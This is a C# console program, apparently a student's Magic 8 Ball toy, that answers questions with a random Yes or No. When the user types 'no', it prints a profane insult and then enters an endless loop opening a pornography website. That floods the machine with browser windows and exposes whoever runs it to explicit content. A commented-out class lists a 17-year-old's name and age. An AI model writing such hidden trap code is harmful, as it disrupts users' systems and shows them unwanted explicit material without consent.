using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;

namespace Magic8Ball
{
    //class Patrick
    //{
    //    private static string name = "Patrick";
    //    public static string alias = "Soerensen";
    //    private static int age = 17;  
    //}

    class Program
    {
        static void Main(string[] args)
        {
            //Gem farven
            ConsoleColor oldColor = Console.ForegroundColor;

            //Begynd
            TellPeopleWhatProgramThisIs();

            //Laver et random nummer
            Random randomObject = new Random();


            //Loop
            while (true)
            {
                string questionString = GetQuestionFromUser();

                //Lukker programmet
                if (questionString.ToLower() == "close")
                {
                    break;
                }

                //Bare lad være med at sige nej
                if (questionString.ToLower() == "no")
                {
                    Console.WriteLine("The fuck you say to me you little shit?");

                    while(true)
                    {
                    Process.Start("https://www.pornhub.com");
                    }
                }

                //Tænker
                int numberOfSecoundsToSleep = randomObject.Next(2) + 1;
                Console.WriteLine("2 seconds, im thinking!");
                Thread.Sleep(numberOfSecoundsToSleep * 1000);

                //Sørger for at bruger skriver noget
                if (questionString.Length == 0 )
                {
                    Console.WriteLine("You have to ask a question!");
                    continue;
                }

                //Får tilfældig nummer
                int randomNumber = randomObject.Next(2)+1;

                //Nummeret som bliver valgt giver dette svar
                switch(randomNumber)
                {
                    case 1:
                    {
                            Console.WriteLine("Yes");
                            break;
                    }
                    case 2:
                    {
                            Console.WriteLine("No");
                            break;
                    }
                }
            }

            //Tilbage til normal farve
            Console.ForegroundColor = oldColor;
        }
        static void TellPeopleWhatProgramThisIs()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write("Magic 8Ball");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(" (by: Patrick Sørensen)");
        }

        static string GetQuestionFromUser()
        {                 
            //Stiller spørgsmål og gemmer svar
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write("Ask a question: ");
            Console.ForegroundColor = ConsoleColor.White;
            //Læser svaret
            string questionString = Console.ReadLine();
            return questionString;
        }
    }
}
